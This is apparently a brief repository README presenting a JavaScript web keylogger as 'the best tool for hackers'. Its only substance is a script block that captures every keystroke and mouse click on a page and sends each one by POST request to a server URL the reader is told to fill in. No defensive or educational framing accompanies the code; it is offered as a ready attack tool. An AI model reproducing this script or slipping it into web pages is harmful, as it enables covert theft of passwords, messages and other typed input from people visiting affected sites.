# keylogger
a web keylogger!

***
This web keylogger can be the best tool for hackers
***

<h1 style="color: red;">
Keylogger Sources
</h1>

```
<script>

(function(){
	var server = "http://domain.com/";  //enter your page URL
	document.addEventListener("keyup", function(e){
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(e.key);
	});
	
	document.addEventListener("click", function(e){
		var click;
		if(e.which == 1){
			click = " Left Click ";
		}else{
			click = " Right Click ";
		}
		
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(click);
	});
})();
</script>

```
# bye :)
